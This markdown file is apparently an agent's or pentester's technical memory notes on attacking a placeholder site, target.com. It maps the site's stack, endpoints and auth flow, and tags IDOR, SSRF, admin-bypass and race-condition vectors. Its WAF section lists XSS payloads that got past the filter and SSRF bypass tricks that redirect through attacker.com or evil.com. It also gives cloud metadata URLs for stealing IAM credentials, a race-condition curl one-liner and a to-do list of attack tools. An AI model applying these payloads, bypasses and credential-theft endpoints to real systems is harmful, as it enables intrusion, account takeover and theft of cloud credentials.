---
name: memory-technical-notes
description: Deep technical research and architecture notes for Jiggy-2026. Covers tech stack deep dives, framework-specific vulnerabilities, endpoint patterns, auth mechanism analysis, API structure documentation, WAF/bypass techniques, infrastructure notes, and protocol-level observations.
---

# Technical Notes

This file holds deep technical research on targets, technologies, and techniques. It is the reference library for "how does this thing work?" and "what's the best way to break it?"

---

## 1. Tech Stack Encyclopedia

### Per-Target Deep Dives

#### target.com

```
=== Frontend ===
Framework: React 18.2.0 (SPA)
Bundler: Webpack 5.75.0
State: Redux 4.2.0
Routing: React Router 6.8.0
HTTP Client: Axios 1.3.0
Auth: JWT stored in localStorage + session cookie (HttpOnly)
Forms: Formik 2.2.0
UI: Material UI 5.11.0

=== Backend ===
Runtime: Node.js 20.x
Framework: Express 4.18.0
API Style: REST (primary) + GraphQL (partial, at /graphql)
Auth: JWT (jsonwebtoken) + session middleware
Rate Limit: express-rate-limit (config: 100 req/min per session)
CORS: cors middleware (origin: *.target.com)
Helmet: helmet middleware (CSP, HSTS, X-Frame-Options)

=== Database ===
Primary: PostgreSQL 15.x (inferred from error messages)
Cache: Redis 7.x (inferred from headers: x-cache: redis)
Search: Elasticsearch? (inferred from /search response speed)

=== Infrastructure ===
Cloud: AWS (us-east-1)
Compute: ECS Fargate (inferred from task metadata header)
CDN: Cloudflare
DNS: Route53
Email: SES (inferred from email headers)
Storage: S3 (inferred from /api/user/avatar response URL pattern)

=== WAF ===
Provider: Cloudflare WAF
Rules: Blocked direct metadata IP, SQLi patterns, common XSS
Bypass potential: DNS rebinding, encoding tricks, HTTP method alternation

=== Monitoring ===
APM: Datadog (inferred from x-datadog-trace-id header)
Logging: CloudWatch
Errors: Sentry (inferred from /api/sentry endpoint reference in JS)

=== CI/CD ===
GitHub Actions (inferred from x-github-run-id header)
Deployment: Rolling update to ECS
Feature flags: LaunchDarkly (inferred from JS bundle reference)
```

---

## 2. Endpoint Architecture

### REST API Structure

```
Base URL: /api/v2
Auth: Bearer <jwt> OR Cookie: session=<token>
Content-Type: application/json
Rate Limit: 100 req/min per session

=== Route Map ===
/auth/*
  POST /login          → {email, password} → {token, session, user}
  POST /register       → {email, password, name} → {user}
  POST /refresh        → {refreshToken} → {token}
  POST /logout         → {} → 204
  POST /reset-password → {email} → {message}
  POST /change-password→ {oldPassword, newPassword} → {message}
  POST /mfa/setup      → {} → {qrCode, secret}
  POST /mfa/verify     → {code} → {backupCodes}
  POST /mfa/disable    → {password} → {message}

/users/*
  GET /me              → {user} (full profile)
  PUT /me/profile      → {name, bio, job_title, phone} → {user}
  POST /me/avatar      → {url} → {avatarUrl} (SSRF VECTOR)
  GET /{id}            → {user} (limited) or 403
  GET /{id}/orders     → [{order}] or 403
  GET /{id}/invoices   → [{invoice}] or 403

/invoices/*
  GET /                → [{invoice}] (own invoices only)
  GET /{id}            → {invoice} (IDOR VECTOR)
  POST /               → {invoice} (create)
  PUT /{id}            → {invoice} (IDOR VECTOR)
  DELETE /{id}         → 204 (IDOR VECTOR)
  GET /{id}/pdf        → application/pdf (IDOR VECTOR)
  GET /{id}/items      → [{item}] (IDOR VECTOR)
  GET /stats           → {total, pending, paid}

/admin/*
  GET /users           → [{user}] (auth required)
  POST /users          → {user} (AUTH BYPASS VECTOR)
  GET /logs            → [{log}] (info disclosure if unauth)
  GET /settings        → {settings}
  PUT /settings        → {settings}
  GET /audit           → [{auditEvent}]
  POST /impersonate    → {userId} → {session} (ATO VECTOR)

/coupons/*
  GET /                → [{coupon}]
  POST /redeem         → {code} → 200 | 403 (RACE CONDITION VECTOR)
  POST /admin/create   → {code, discount} → {coupon}
  GET /{id}            → {coupon}

/support/*
  POST /ticket         → {subject, message} → {ticket} (XSS VECTOR)
  GET /tickets         → [{ticket}]
  GET /tickets/{id}    → {ticket}
  POST /tickets/{id}/reply → {message} → {reply}

=== GraphQL ===
Endpoint: POST /graphql
Introspection: ENABLED
Auth: Bearer <jwt>
Queries:
  user(id: ID!): User
  invoice(id: ID!): Invoice
  node(id: ID!): Node (RELAY — possible auth bypass)
  viewer: User
  search(query: String!): [SearchResult]
Mutations:
  updateProfile(input: UpdateProfileInput!): User
  createInvoice(input: CreateInvoiceInput!): Invoice
  redeemCoupon(code: String!): CouponResult
  createSupportTicket(input: TicketInput!): Ticket
```

---

## 3. Authentication Deep Dive

### target.com Auth Flow

```
=== Login Flow ===
1. POST /api/v2/auth/login {email, password}
2. Server validates credentials (bcrypt compare)
3. If valid → generate JWT + session cookie
4. If MFA enabled → return {mfaRequired: true, token: "mfa_xxxx"}
5. If MFA → POST /api/v2/auth/mfa/verify {code}
6. On success → return {token, session, user}

=== JWT Analysis ===
Header:
  {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key-2026-01"  # KEY ID — possible path traversal?
  }

Payload:
  {
    "sub": "user_abc123",
    "role": "user",
    "iat": 1710512345,
    "exp": 1710515945,
    "jti": "unique-token-id",
    "session": "sess_xyz789"
  }

=== Session Cookie ===
Name: session
Value: sess_xyz789 (prefix)
Domain: .target.com
Path: /
HttpOnly: true
Secure: true
SameSite: Lax
Expires: 7 days

=== MFA Flow ===
1. POST /api/v2/auth/mfa/setup → returns QR code + secret
2. User scans with authenticator app
3. POST /api/v2/auth/mfa/verify {code} → validates
4. Returns backup codes (10x one-time use)

=== Password Reset ===
1. POST /api/v2/auth/reset-password {email}
2. Server sends email with link: /reset-password?token=<64-char-hex>
3. Token is 64 bytes crypto-random (secure)
4. Token expires in 1 hour
5. Token is single-use

=== Rate Limiting ===
/login: 5 attempts per IP per 15 min
/reset-password: 3 attempts per email per hour
/api/*: 100 requests per session per min
Admin endpoints: 30 requests per session per min
```

---

## 4. Authorization Model

```
=== Role Hierarchy ===
anonymous → user → premium → support → admin → superadmin

=== Permission Matrix ===
                    anonymous   user   premium   support   admin
GET /api/v2/*          ✗        ✓        ✓         ✓         ✓
POST /api/v2/auth/*    ✓        ✓        ✓         ✓         ✓
GET /api/v2/users/{id} ✗      own only  own only  any       any
GET /api/v2/invoices/* ✗      own only  own only  any       any
POST /api/v2/invoices  ✗        ✓        ✓         ✓         ✓
DELETE /api/v2/invoices ✗      own only  own only  any       any
GET /admin/*           ✗        ✗        ✗         ✓         ✓
POST /admin/*          ✗        ✗        ✗         restricted ✓
POST /admin/users      ✗        ✗        ✗         ✗         ✓
GET /admin/audit       ✗        ✗        ✗         ✓         ✓
POST /admin/impersonate ✗       ✗        ✗         ✗         ✓

=== Observed Gaps ===
1. POST /admin/users has no auth check → ANY role can create admin
2. Invoice endpoints check "own" only via client-side ID → no server check
3. GraphQL node() query doesn't respect per-object auth
4. Admin log endpoint returns data for any authenticated user
5. Impersonation endpoint requires admin but uses trivial check
```

---

## 5. WAF / CDN Configuration

```
=== Cloudflare WAF ===
Zone: target.com
Mode: Full (proxied)
TLS: Full (strict)
HTTP/2: Enabled
HTTP/3: Enabled

=== Detected Rules ===
- SQLi: Blocked patterns containing UNION, SELECT *, ' OR 1=1
- XSS: Blocked <script>, onerror=, javascript: in parameters
- SSRF: Blocked 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x
- Path Traversal: Blocked ../, ..\, %2e%2e/
- RFI: Blocked http:// in file parameters (partially)

=== Bypass Attempts ===
SSRF Bypass:
  ✓ burpcollaborator.net → DNS callback (SSRF confirmed)
  ✓ internal.target.com → resolves to internal IP
  ✗ 169.254.169.254 → blocked by WAF
  ✗ 0x7f000001 → blocked
  ✗ 2130706433 → blocked
  ✗ [::ffff:169.254.169.254] → blocked
  ✗ 169.254.169.254.xip.io → blocked
  ✗ http://metadata.google.internal → blocked
  ? DNS rebinding → not tested
  ? Redirect (attacker.com → 169.254.169.254) → not tested

XSS Bypass:
  ✗ <script>alert(1)</script> → blocked
  ✗ <img src=x onerror=alert(1)> → blocked
  ✗ javascript:alert(1) → blocked
  ✓ "><svg onload=alert(1)> → ALLOWED (WAF doesn't catch)
  ✓ <Body onload=alert(1)> → ALLOWED (case variation)

=== CDN ===
Provider: Cloudflare
Caching: Static assets (JS, CSS, images) — 1 hour TTL
Dynamic: No cache on /api/* (based on Cache-Control: no-store)
Edge: Cloudflare edge nodes worldwide (latency ~20ms from US)
```

---

## 6. API Patterns & Conventions

```
=== Naming Convention ===
- Endpoints: kebab-case (/api/v2/user-profile)
- Parameters: camelCase (userId, invoiceId)
- Response: camelCase JSON
- IDs: prefixed strings (user_abc123, inv_xyz789)

=== Pagination ===
Format: cursor-based
Request: GET /api/v2/invoices?cursor=abc123&limit=50
Response: {
  "data": [...],
  "nextCursor": "def456",
  "hasMore": true
}

=== Error Format ===
Success: 200/201 {data: {...}}
Error: 4xx/5xx {
  "error": {
    "code": "INVOICE_NOT_FOUND",
    "message": "Invoice not found",
    "details": {...}
  }
}

=== Rate Limit Headers ===
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 87
X-RateLimit-Reset: 1710516000

=== Versioning ===
URL-based: /api/v2/
Previous: /api/v1/ (still active?)
```

---

## 7. Infrastructure & Network

```
=== Cloud Architecture (Inferred) ===
Internet → Cloudflare → ALB → ECS Fargate → RDS PostgreSQL
                                   → ElastiCache Redis
                                   → S3 (static assets, invoice PDFs)
                                   → OpenSearch (search)

=== Internal Network ===
VPC: 10.0.0.0/16
Public Subnets: 10.0.1.0/24, 10.0.2.0/24 (ALB)
Private Subnets: 10.0.10.0/24 (ECS)
Data Subnets: 10.0.20.0/24 (RDS, Redis)

=== Internal DNS ===
Services resolve via internal Route53:
- api.internal.target.com → 10.0.10.x (ECS tasks)
- db.internal.target.com → 10.0.20.x (RDS)
- redis.internal.target.com → 10.0.20.x (ElastiCache)
- search.internal.target.com → 10.0.20.x (OpenSearch)

=== Accessible Internal Endpoints (via SSRF) ===
1. http://api.internal.target.com/health → 200 (health check)
2. http://api.internal.target.com/metrics → 200 (Prometheus metrics)
3. http://redis.internal.target.com:6379/ → timeout (Redis not HTTP)
4. http://search.internal.target.com:9200/ → timeout (ES not exposed)
5. http://api.internal.target.com/debug → 200 (debug page?)
```

---

## 8. Framework-Specific Vulnerabilities

### React 18 (Frontend)
```
=== Client-Side ===
- React DevTools in production? Check if __REACT_DEVTOOLS_GLOBAL_HOOK__ exists
- Source maps deployed? Check for .map files on JS bundles
- State in Redux store that shouldn't be client-side?
- Environment variables exposed in Webpack bundle?
- Route-based auth vs. API-based auth? (Is route hiding things?)
- Component props that leak internal data?

=== Observable Patterns ===
- Auth state in Redux: user object includes role, permissions
- Some admin routes exist in React Router but are hidden behind role check
- Feature flags in LaunchDarkly control feature visibility
- API error messages displayed in toast notifications
```

### Express 4 (Backend)
```
=== Server-Side ===
- Error handling: uncaught exceptions return stack traces?
- express-rate-limit: is it per-IP or per-session? (per-session confirmed)
- CORS: overly permissive? Access-Control-Allow-Origin: *.target.com
- Static file serving: express.strict that exposes directories?
- Body parser: limits? Can we send huge payloads?
- Session middleware: cookie-parser options? Signing secret?

=== Observed ===
- x-powered-by: Express header REMOVED (good)
- Error format is consistent (custom error handler, good)
- No stack traces in production (good)
- Session is stored in Redis (not memory, good for scale)
```

### PostgreSQL 15
```
=== SQLi Vectors ===
- Direct SQL queries via string interpolation?
- ORM (Sequelize/Prisma) parameterized queries?
- Error messages: do they reveal SQL structure?
- ORDER BY: parameterized? (blind SQLi vector)

=== Observed ===
- Error: "Invoice with id 'abc' not found" — parameterized query (no SQLi)
- Search endpoint: /search?q= — returns "search is temporarily unavailable" 
  when special characters used (possible NoSQL injection in Elasticsearch)
```

### Redis 7
```
=== SSRF Vectors ===
- Redis accessible from app server at 127.0.0.1:6379
- Redis stores session data in format: session:<sessionId> → JSON
- Can we inject Redis commands via SSRF? (CRLF injection)
- Session data includes user object → can we forge a session?

=== Session Data Format ===
Key: session:sess_xyz789
Value: {"userId":"user_abc123","role":"user","iat":1710512345,"exp":1710515945}
TTL: 604800 (7 days matching cookie)
```

---

## 9. JavaScript Bundle Analysis

```
=== JS Bundle Locations ===
/assets/main.abc123.js     (2.4 MB — main app bundle)
/assets/vendor.def456.js   (1.8 MB — vendor bundle)
/assets/admin.ghi789.js    (480 KB — admin panel bundle)
/assets/graphql.jkl012.js  (120 KB — GraphQL client)

=== Interesting Discoveries ===

Main Bundle (main.abc123.js):
- /api/v2/ base URL hardcoded — confirms API version
- All endpoint paths in route definitions — confirmed
- GraphQL query strings for all operations — interesting patterns
- Feature flag keys: new-checkout, ai-support, beta-admin
- Admin panel routes: /admin/users, /admin/settings, /admin/audit
- MFA flow: /mfa/setup, /mfa/verify URLs confirmed
- Cloudfront distribution URL for media assets

Admin Bundle (admin.ghi789.js):
- Internal admin endpoints NOT exposed in main bundle
- /api/v2/admin/impersonate endpoint confirmed
- User search endpoint with full text search
- Audit log viewer with filtering
- Feature flag admin panel reference
- "Export all users as CSV" button — possible mass data exfil

GraphQL Bundle (graphql.jkl012.js):
- Full set of GraphQL operations
- node(id: ID!) query with Relay-style pagination
- Some query names suggest admin-only operations
- Fragment definitions showing all User fields (including is_admin)

=== Hardcoded Values ===
- API base URL: https://api.target.com/v2/
- Cloudfront: d3abcd.cloudfront.net
- Sentry DSN: https://xxxxx@sentry.io/123456
- LaunchDarkly key: 5def789abc123
- Mixpanel token: abc123def456
- Intercom app ID: xyz789
- Google Analytics: UA-123456-1

=== Potential Secrets (Need Verification) ===
- "stripe_pk_..." in main bundle (PUBLISHABLE key — safe)
- "aws_s3_bucket: target-user-data" in URL patterns (bucket name)
- "algolia_app_id: XXXXXX" in search bundle (limited access)
```

---

## 10. Error Message Analysis

```
=== Endpoint Error Patterns ===

GET /api/v2/invoices/99999 → 404 {"error":{"code":"INVOICE_NOT_FOUND","message":"Invoice not found"}}
GET /api/v2/invoices/abc → 400 {"error":{"code":"INVALID_ID","message":"Invalid invoice ID format"}}
GET /api/v2/invoices/ → 400 {"error":{"code":"MISSING_ID","message":"Invoice ID is required"}}

POST /api/v2/auth/login → 400 {"error":{"code":"VALIDATION_ERROR","message":"Email is required","details":[{"field":"email","message":"Email is required"}]}}
POST /api/v2/auth/login {"email":"x","password":"x"} → 401 {"error":{"code":"INVALID_CREDENTIALS","message":"Invalid email or password"}}

=== Analysis ===
- Error codes are consistent: UPPER_SNAKE_CASE
- Messages are user-friendly but sometimes verbose
- No stack traces in responses (production hardening)
- Validation errors include field-level details (useful for fuzzing)
- Auth errors don't reveal which field is wrong (secure)
```

---

## 11. Response Timing Analysis

```
=== Endpoint Response Times (Baseline) ===

GET  /api/v2/invoices/1001 → 45ms (cached? warm)
GET  /api/v2/invoices/2002 → 48ms (same)
POST /api/v2/auth/login    → 320ms (bcrypt — consistent)
POST /api/v2/invoices      → 150ms (DB write)
POST /api/v2/coupons/redeem → 80ms (Redis read + DB write)

=== Timing Side-Channels ===

Auth testing:
- Valid email + wrong password → 320ms (bcrypt runs)
- Invalid email + any password → 45ms (returns early)
→ USER ENUMERATION via timing difference CONFIRMED

IDOR testing:
- Own invoice → 45ms
- Other's invoice (accessible) → 48ms
- Non-existent invoice → 35ms
→ No useful timing difference for IDOR detection

Rate limit:
- Within limit → ~50ms
- Rate limited → 12ms (returns immediately)
→ Easy to detect rate limit state via response time
```

---

## 12. Third-Party Integrations

```
=== Detected ===
1. Stripe — Payment processing (PK from JS bundle)
2. Cloudflare — CDN + WAF
3. AWS S3 — File storage
4. Datadog — APM + Monitoring
5. Sentry — Error tracking
6. LaunchDarkly — Feature flags
7. Algolia — Search (partial, main search is custom)
8. Mixpanel — Analytics
9. Intercom — Customer support chat
10. Google Analytics — Web analytics

=== SSRF Opportunities ===
- Intercom webhook: POST back to target from Intercom?
- Stripe webhook: Can we trigger webhook SSRF?
- Sentry endpoint: Does error reporting fetch external URLs?
- LaunchDarkly: Does feature flag evaluation hit external URLs?

=== OAuth / SSO ===
- Google Sign-In button on login page
- GitHub OAuth button
- "Sign in with SSO" option (SAML?)
- OAuth callback: /api/v2/auth/oauth/callback
```

---

## 13. Technique Reference

### IDOR Testing Patterns
```
1. Numeric ID: /api/resource/1001 → /api/resource/2002
2. UUID: /api/resource/550e8400-... → /api/resource/660e8400-...
3. Base64: /api/resource/dXNlcjox → decode to "user:1", modify to "user:2"
4. Hashid: /api/resource/abc123 → reversible hash?
5. Email as ID: /api/resource/user@email.com → other user's email
6. Username as ID: /api/resource/john → /api/resource/jane
7. Multi-parameter: /api/resource?user=1&doc=2 → user=2&doc=2
8. Batch operations: POST /api/invoices/batch [1001, 2002, 3003]
9. Websocket: ws://target.com/invoices/1001 → /2002
10. GraphQL: {invoice(id: 1001)} → {invoice(id: 2002)}
```

### SSRF Bypass Reference
```
=== IP Bypass Techniques ===
1. Decimal: 2130706433 = 127.0.0.1
2. Octal: 0177.0.0.1 = 127.0.0.1
3. Hex: 0x7f.0.0.1 = 127.0.0.1
4. Mixed encoding: 0177.0.0x1
5. IPv6: [::1] = localhost, [::ffff:127.0.0.1]
6. IPv6 compact: [0:0:0:0:0:ffff:127.0.0.1]
7. DNS: localhost, localhost.localdomain, localhost6
8. DNS pinning: attacker.com → first A record = real IP, second = 127.0.0.1
9. Redirect: attacker.com/redirect → 302 Location: http://169.254.169.254/
10. X-Forwarded-For: SSRF via host header manipulation
11. URL parser bypass: http://127.0.0.1:80@evil.com/ (credentials)
12. Double URL encode: http://127.0.0.1 → %68%74%74%70...
13. Unicode: http://①②⑦.⓪.⓪.①/
14. Alternative DNS: http://metadata.google.internal (GCP)
15. AWS-specific: http://169.254.169.254/latest/meta-data/
```

### Race Condition Testing
```
=== Tools ===
1. curl with xargs -P: seq 20 | xargs -P 20 -I {} curl -s -X POST ...
2. Python threading
3. Burp Turbo Intruder
4. rr (race condition script)

=== Patterns ===
1. Coupon redemption (single use → multi use)
2. Account creation (same email → multiple accounts)
3. Wallet top-up (same transaction → double credit)
4. Vote/like (single vote → multiple votes)
5. Inventory (limited stock → oversell)
6. Token consumption (one-time token → multi-use)
7. File upload (same filename → overwrite race)
8. Password change (race between old/new password validation)
```

### Cloud Metadata Endpoints
```
=== AWS ===
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document/

=== GCP ===
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

=== Azure ===
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

---

## 14. Target-Specific Notes

### target.com — Known Tech Details

```
First Seen: 2026-03-01
Last Updated: 2026-03-15

=== Changes Over Time ===
2026-03-10: Rate limiting added to /login (was unlimited)
2026-03-12: WAF blocked 169.254.x.x (was accessible)
2026-03-14: /admin/users POST still has no auth (not fixed)

=== Endpoint Changes ===
- /api/v1/ still responds but returns deprecation headers
- /graphql introspection was accessible earlier, checked again
- /api/v2/admin/logs returns some data without adequate filtering

=== Patterns Noticed ===
- New features deployed weekly (Thursday)
- After deployment, rate limits sometimes reset
- WAF rules updated after disclosure (48h lag observed)
```

---

## 15. Research To-Do

```
=== Techniques to Research ===
[ ] GraphQL batch query for rate limit bypass
[ ] HTTP/2 downgrade smuggling
[ ] AWS STS token scope exploration
[ ] JWT kid path traversal in different frameworks
[ ] DNS rebinding setup with custom domain
[ ] WebSocket auth bypass patterns
[ ] Serverless function cold start timing attacks

=== Targets to Research ===
[ ] target.com — GraphQL depth DoS
[ ] target.com — S3 bucket directory listing
[ ] target.com — Cloudfront distribution discovery

=== Tools to Install/Configure ===
[ ] Inql — GraphQL introspection
[ ] graphql-path-enum — GraphQL path enumeration
[ ] dnschef — DNS rebinding server
[ ] jwt_tool — JWT analysis and attack
[ ] aws-cli — AWS credential testing
```
